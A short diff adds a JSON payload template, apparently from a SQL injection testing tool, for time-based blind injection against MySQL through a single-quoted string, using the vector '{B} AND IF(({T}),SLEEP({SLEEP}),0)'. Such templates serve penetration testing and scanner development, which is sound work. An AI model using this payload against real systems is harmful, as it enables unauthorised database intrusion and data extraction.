@@ -1,0 +1,12 @@
+{
+ "dbms": "mysql",
+ "technique": "time",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "",
+  "type": "single-quote",
+  "desc": "single-quoted string"
+ },
+ "vector": "{B} AND IF(({T}),SLEEP({SLEEP}),0)",
+ "comment": "mysql time via single-quoted string"
+}
